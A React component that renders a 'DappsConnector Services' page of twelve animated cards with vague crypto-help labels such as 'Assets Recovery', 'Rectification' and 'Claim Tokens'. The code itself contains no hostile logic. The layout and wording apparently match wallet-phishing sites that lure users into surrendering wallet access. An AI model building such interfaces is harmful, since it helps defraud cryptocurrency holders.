
import { ServiceCard } from "./ServiceCard";
import { 
  CodeIcon, ShieldIcon, ChatIcon, CoinIcon, 
  WalletIcon, ErrorIcon, GasIcon, StakingIcon
} from "./ServiceIcons";
import { motion } from "framer-motion";

const services = [
  {
    title: "Buy Presale",
    description: "Click here to get your token presale.",
    icon: <CoinIcon />
  },
  {
    title: "Claim Tokens",
    description: "Click here to claim your tokens.",
    icon: <ShieldIcon />
  },
  {
    title: "Migration Issues",
    description: "Click here for migration related issues.",
    icon: <CodeIcon />
  },
  {
    title: "Assets Recovery",
    description: "Click here for assets recovery issues",
    icon: <ShieldIcon />
  },
  {
    title: "General Issues",
    description: "Click here for general related issues.",
    icon: <ChatIcon />
  },
  {
    title: "Rectification",
    description: "Click here to rectify issues.",
    icon: <CoinIcon />
  },
  {
    title: "High Gas Fees",
    description: "Click here for gas fee related issues.",
    icon: <GasIcon />
  },
  {
    title: "Claim Reward",
    description: "Click here for reward related issues.",
    icon: <ShieldIcon />
  },
  {
    title: "Deposits & Withdrawals",
    description: "Click here for withdrawal related issues.",
    icon: <ChatIcon />
  },
  {
    title: "Slippage Error",
    description: "Click here for slippage related error during trade.",
    icon: <ErrorIcon />
  },
  {
    title: "Transaction Error",
    description: "Click here for transaction related issues.",
    icon: <CodeIcon />
  },
  {
    title: "Staking Issues",
    description: "Click here for staking related issues.",
    icon: <StakingIcon />
  }
];

const container = {
  hidden: { opacity: 0 },
  show: {
    opacity: 1,
    transition: {
      staggerChildren: 0.1,
      delayChildren: 0.3
    }
  }
};

const item = {
  hidden: { opacity: 0, y: 20 },
  show: { opacity: 1, y: 0 }
};

export function ServicesPage() {
  return (
    <div className="pt-24 pb-16 px-4 sm:px-6 lg:px-8 min-h-screen">
      <div className="max-w-6xl mx-auto">
        <motion.h1 
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="text-3xl md:text-4xl font-bold text-gray-800 mb-12 text-center"
        >
          DappsConnector Services
        </motion.h1>
        
        <motion.div 
          variants={container}
          initial="hidden"
          animate="show"
          className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6"
        >
          {services.map((service, index) => (
            <motion.div key={index} variants={item}>
              <ServiceCard
                title={service.title}
                description={service.description}
                icon={service.icon}
              />
            </motion.div>
          ))}
        </motion.div>
      </div>
    </div>
  );
}
